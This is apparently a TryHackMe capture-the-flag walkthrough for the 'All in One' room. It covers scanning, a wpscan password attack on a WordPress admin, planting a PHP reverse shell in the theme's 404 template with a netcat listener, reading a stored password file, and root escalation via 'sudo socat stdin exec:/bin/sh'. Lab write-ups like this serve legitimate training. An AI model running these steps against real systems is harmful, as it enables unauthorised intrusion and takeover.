# THM: All in One

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/all_in_one/all_in_one.png" alt="All in One" width="90"/> |
| Room | All in One |
| URL | https://tryhackme.com/room/allinonemj |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](/tools/ftp.md)
- [gobuster](/tools/gobuster.md)
- [wpscan](/tools/wpscan.md)
- [find](/tools/find.md)
- base64

## Room Description

This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-14 18:12 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Initiating ARP Ping Scan at 18:12
Scanning target.thm (10.10.242.126) [1 port]
Completed ARP Ping Scan at 18:12, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:12
Scanning target.thm (10.10.242.126) [65535 ports]
Discovered open port 22/tcp on 10.10.242.126
Discovered open port 21/tcp on 10.10.242.126
Discovered open port 80/tcp on 10.10.242.126
Completed SYN Stealth Scan at 18:12, 2.30s elapsed (65535 total ports)
Initiating Service scan at 18:12
Scanning 3 services on target.thm (10.10.242.126)
Completed Service scan at 18:12, 6.04s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.242.126.
Initiating NSE at 18:12
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 18:12, 0.84s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.05s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Nmap scan report for target.thm (10.10.242.126)
Host is up (0.00013s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.137.140
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:77:89:7F:E5:71 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Since the ftp service allows ftp user login I checked it first. I didn't find anything:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.5)
Name (target.thm:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
```

I decided to look around the website and couldn't find anything so I ran gobuster:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/wordpress            (Status: 301) [Size: 312] [--> http://target.thm/wordpress/]
/hackathons           (Status: 200) [Size: 197]
```

Inspecting the source code at http://target.thm/hackathons has some interesting comments:
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->

This took me a while to catch but this is a Vigenère Cipher. The page these comments were found on mentions vinegar which is spelt close to Vigenère. Anyways, I went to [this site](https://www.dcode.fr/vigenere-cipher) and used KeepGoing as the key. This gave the following result:

`Try REDACTED`

I note the result and move onto http://target.thm/wordpress. I looked around and found the main article was written by a user named elyana. I decide to run wpscan. So I saved the password found earlier with the Vigenère cipher in a file called passwords.txt and ran the following:

```bash
$ wpscan --url http://target.thm/wordpress -e u -P passwords.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://target.thm/wordpress/ [10.10.57.168]
[+] Started: Wed Jul 16 21:04:02 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://target.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://target.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://target.thm/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://target.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://target.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://target.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://target.thm/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://target.thm/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://target.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://target.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://target.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
Trying elyana / H@ckme@123 Time: 00:00:00 <=====> (1 / 1) 100.00% Time: 00:00:00
Trying elyana / H@ckme@123 Time: 00:00:00 <===   > (1 / 2) 50.00%  ETA: ??:??:??
[SUCCESS] - elyana / REDACTED                                                 

[!] Valid Combinations Found:
 | Username: elyana, Password: REDACTED

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul 16 21:04:09 2025
[+] Requests Done: 55
[+] Cached Requests: 6
[+] Data Sent: 14.912 KB
[+] Data Received: 399.444 KB
[+] Memory used: 191.82 MB
[+] Elapsed time: 00:00:07
```

## Gaining a Foothold

The elyana username works with the password found earlier. I log into WordPress at http://target.thm/wordpress/wp-login.php using those credentials. It turns out that elyana is an admin for the site! I can change the theme to use a PHP reverse shell and get a shell onto the server. I run the following to create a copy of the reverse shell file:

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

I update the file to use my attack box ip address and port 4444. I start a listening shell on my attack machine with the following command:

```bash
$ nc -lnvp 4444
```

I alter the them in the WordPress site by clicking the Appearance > Theme Editor on the left. Then I click the 404.php template and paste the contents of the shell.php mentioned above. I click the Update button and then navigate to a page that will cause a 404 error. In my case, I went to http://target.thm/wordpress/index.php/2020/10/05/hello-world-1/

I have a shell. I'm in!

I get a stable shell by running the commands [found here](/README.md#stable-shell).

## user.txt

I go to /home/elyana and notice two files. First the user.txt file that I can't access and a hint.txt. I view the contents of hint.txt:

```bash
$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

I run the following command to search for a file that elyana owns:

```bash
$ find / -type f -user elyana 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
```

The private.txt file looks suspicious so I view its contents:

```bash
$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: REDACTED
```

Now that I have the password, I switch users.

```bash
$ su elyana
```

Now I read the file:

```bash
$ cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

This looks encoded and so I try to base64 decode it:

```bash
$ cat user.txt | base64 -d
REDACTED
```

## Escalating Privileges

I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:

```bash
$ sudo -l
Matching Defaults entries for elyana on ip-10-10-253-46:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on ip-10-10-253-46:
    (ALL) NOPASSWD: /usr/bin/socat
```

The socat command can execute commands. So I run the following:

```bash
$ sudo socat stdin exec:/bin/sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## root.txt

I ran the following to get the flag:

```bash
# whoami
root
# cd /root
# ls
root.txt  snap
# cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
# cat root.txt | base64 -d
REDACTED
```
